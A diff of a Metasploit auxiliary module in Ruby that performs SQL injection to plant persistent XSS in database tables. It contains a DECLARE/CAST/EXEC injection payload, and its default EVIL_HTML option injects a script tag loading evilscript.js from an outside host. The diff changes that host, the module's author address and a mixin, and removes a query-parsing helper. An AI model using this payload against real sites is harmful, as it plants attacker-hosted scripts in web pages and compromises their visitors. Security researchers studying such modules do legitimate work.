@@ -17,7 +17,7 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::WMAPScanQuery
+	include Msf::Auxiliary::WMAPScanUniqueQuery
 	include Msf::Auxiliary::Scanner
 
 
@@ -29,7 +29,7 @@ class Metasploit3 < Msf::Auxiliary
 				use lately by concatenation of HTML string that forces a persistant
 				XSS attack to redirect user browser to a attacker controller website.
 			},
-			'Author'         => [ 'ET LoWNOISE et [at] cyberspace.org' ],
+			'Author'         => [ 'ET LoWNOISE et [at] metasploit.com' ],
 			'License'        => BSD_LICENSE,
 			'Version'        => '$Revision: 1000 $'))   
 			
@@ -40,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
 				OptString.new('VULN_PAR', [ true,  "Vulnerable parameter name", 'p1']),
 				OptBool.new('TEXT_INT_INJECTION', [ true,  "Perform string injection", false]),
 				OptBool.new('COMMENTED', [ true,  "Comment end of query", true]),
-				OptString.new('EVIL_HTML', [ true,  "Evil HTML to add to tables", '<script src=http://evils1te.org/evilscript.js></script>']), 
+				OptString.new('EVIL_HTML', [ true,  "Evil HTML to add to tables", '<script src=http://browser-autopwn.com/evilscript.js></script>']), 
 			], self.class)	
 						
 	end
@@ -72,7 +72,7 @@ DECLARE @T varchar(255),@C varchar(255)
 		prestr = ";DECLARE @S NVARCHAR(4000);SET @S=CAST("
 		poststr = " AS NVARCHAR(4000));EXEC(@S);"
              
-        gvars = queryparse(datastore['QUERY']) #Now its a Hash
+        	gvars = queryparse(datastore['QUERY']) #Now its a Hash
  
 		if gvars.has_key?(datastore['VULN_PAR'])
            
@@ -104,20 +104,5 @@ DECLARE @T varchar(255),@C varchar(255)
 		
 	end
 
-        #modified from CGI.rb as we dont use arrays, this function may need to be included in proto/http
-	def queryparse(query)
-		params = Hash.new()
-
-		query.split(/[&;]/n).each do |pairs|
-			key,value = pairs.split('=',2)
-			if params.has_key?(key)
-				#Error
-			else
-				params[key] = value
-			end
-		end
-		params
-	end
-      
 end
 	
